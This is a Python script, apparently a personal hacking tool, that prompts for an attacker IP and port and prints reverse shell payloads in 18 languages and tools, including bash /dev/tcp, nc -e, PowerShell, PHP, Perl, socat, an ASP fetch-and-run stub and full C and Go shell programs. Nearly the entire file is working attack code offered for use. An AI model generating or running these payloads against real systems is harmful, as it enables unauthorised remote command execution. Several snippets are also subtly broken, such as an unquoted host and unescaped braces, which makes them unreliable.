import re
import sys
# Define the ASCII art for a hacker typing on a laptop
ascii_art = """
                ______
               /      \
              (  W00f! )
               \  ____/
               ,,    __            404 Hack Not Found
           |`-.__   / /                      __     __
           /"  _/  /_/                       \ \   / /
          *===*    /                          \ \_/ /  405 Not Allowed
         /     )__//                           \   /
    /|  /     /---`                        403 Forbidden
    \\/`   \ |                                 / _ \
    `\    /_\\_              502 Bad Gateway  / / \ \  500 Internal Error
      `_____``-`                             /_/   \_\

     
"""

# Define the hacker emoji
Egypt = "🇪🇬"

# Print the ASCII art and the emoji
def print_hacker_tool():
    print(ascii_art)
    print(f"Omar Loves Egypt {Egypt}")

# Execute the function to display the ASCII art and emoji
print_hacker_tool()

def print_menu():
    """Display menu options to the user."""
    print("\nReverse Shell Payload Generator")
    print("1. Python")
    print("2. Bash")
    print("3. Sh")
    print("4. PowerShell")
    print("5. Netcat (nc)")
    print("6. PHP")
    print("7. Ruby")
    print("8. Perl")
    print("9. Ncat (Nmap)")
    print("10. Socat")
    print("11. Java")
    print("12. Tcl")
    print("13. ASP (Classic)")
    print("14. Node.js")
    print("15. Lua")
    print("16. C")
    print("17. Go")
    print("18. Swift")
    print("0. Exit")

def validate_ip(ip):
    """Validate the IP address format."""
    return re.match(r'^\d{1,3}(\.\d{1,3}){3}$', ip) is not None

def validate_port(port):
    """Validate the port number."""
    return port.isdigit() and 1 <= int(port) <= 65535

def generate_payload(option, lhost, lport):
    """Generate the payload based on the selected option."""
    if option == '1':
        return f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(({lhost},{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    elif option == '2':
        return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    elif option == '3':
        return f"sh -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    elif option == '4':
        return f"$client = New-Object System.Net.Sockets.TcpClient('{lhost}', {lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendback2 = $sendback2 + $sendback2;[byte[]]$sendback2 = [System.Text.Encoding]::ASCII.GetBytes($sendback2);$stream.Write($sendback2,0,$sendback2.Length);$stream.Flush()}}'"
    elif option == '5':
        return f"nc {lhost} {lport} -e /bin/bash"
    elif option == '6':
        return f"<?php exec('/bin/bash -c \"exec 5<>/dev/tcp/{lhost}/{lport}; cat <&5 | while read line; do $line 2>&5; done\"'); ?>"
    elif option == '7':
        return f"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{lhost}\", {lport});loop{c.print(c.gets)}'"
    elif option == '8':
        return f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
    elif option == '9':
        return f"ncat {lhost} {lport} -e /bin/bash"
    elif option == '10':
        return f"socat tcp:{lhost}:{lport} exec:'/bin/bash',pty,stderr,setsid,ctty"
    elif option == '11':
        return f"java -cp /path/to/commons-net.jar CommonsNetReverseShell {lhost} {lport}"
    elif option == '12':
        return f"exec /bin/sh -i < /dev/tcp/{lhost}/{lport} > /dev/tcp/{lhost}/{lport} 2>&1"
    elif option == '13':
        return f"<% Dim o : Set o = CreateObject(\"MSXML2.XMLHTTP\") : o.Open \"GET\", \"http://{lhost}:{lport}/\", False : o.Send : Dim s : Set s = CreateObject(\"WScript.Shell\") : s.Run \"cmd /c \" & o.responseText, 0, False %>"
    elif option == '14':
        return f"require('net').createConnection({lport}, '{lhost}').on('data', function(data) {{ process.stdout.write(data); }}).on('end', function() {{ process.exit(); }});"
    elif option == '15':
        return f"local socket = require('socket') local client = socket.tcp() client:connect('{lhost}', {lport}) while true do local s, err = client:receive() if not s then break end os.execute(s) end"
    elif option == '16':
        return f"""#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

int main() {{
    int sockfd;
    struct sockaddr_in servaddr;
    char *ip = "{lhost}";
    int port = {lport};
    char buffer[1024];
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &servaddr.sin_addr);
    connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr));
    while (1) {{
        memset(buffer, 0, sizeof(buffer));
        read(sockfd, buffer, sizeof(buffer));
        system(buffer);
    }}
    close(sockfd);
    return 0;
}}"""
    elif option == '17':
        return f"""package main

import (
    "fmt"
    "net"
    "os"
    "os/exec"
)

func main() {{
    conn, err := net.Dial("tcp", "{lhost}:{lport}")
    if err != nil {{
        fmt.Println(err)
        os.Exit(1)
    }}
    defer conn.Close()
    for {{
        buffer := make([]byte, 1024)
        n, err := conn.Read(buffer)
        if err != nil {{
            fmt.Println(err)
            return
        }}
        cmd := string(buffer[:n])
        output, _ := exec.Command("/bin/sh", "-c", cmd).CombinedOutput()
        conn.Write(output)
    }}
}}"""
    elif option == '18':
        return f"""import Foundation

let host = "{lhost}"
let port: UInt16 = {lport}

let socket = Socket.create()
do {{
    try socket.connect(to: host, port: port)
    while true {{
        let data = try socket.read(upToCount: 1024)
        if let command = String(data: data, encoding: .utf8) {{
            let process = Process()
            process.executableURL = URL(fileURLWithPath: "/bin/sh")
            process.arguments = ["-c", command]
            try process.run()
            process.waitUntilExit()
        }}
    }}
}} catch {{
    print("Error: \\(error)")
}}
"""
    else:
        return "Invalid option"

def get_valid_input(prompt, validation_func, error_message):
    """Prompt the user for input until a valid value is entered."""
    while True:
        user_input = input(prompt).strip()
        if validation_func(user_input):
            return user_input
        print(error_message)

def main():
    """Main function to handle user input and payload generation."""
    print_menu()

    option = get_valid_input(
        "Select a payload option (0-18): ",
        lambda x: x in map(str, range(0, 19)),
        "Invalid option. Please select a number between 0 and 18."
    )
    
    if option == '0':
        print("Exiting...")
        sys.exit()

    lhost = get_valid_input(
        "Enter the LHOST (IP address): ",
        validate_ip,
        "Invalid IP address format. Please enter a valid IP address."
    )

    lport = get_valid_input(
        "Enter the LPORT (port number): ",
        validate_port,
        "Invalid port number. Ensure it is between 1 and 65535."
    )

    payload = generate_payload(option, lhost, lport)
    print("\nGenerated Payload:")
    print(payload)

if __name__ == "__main__":
    main()
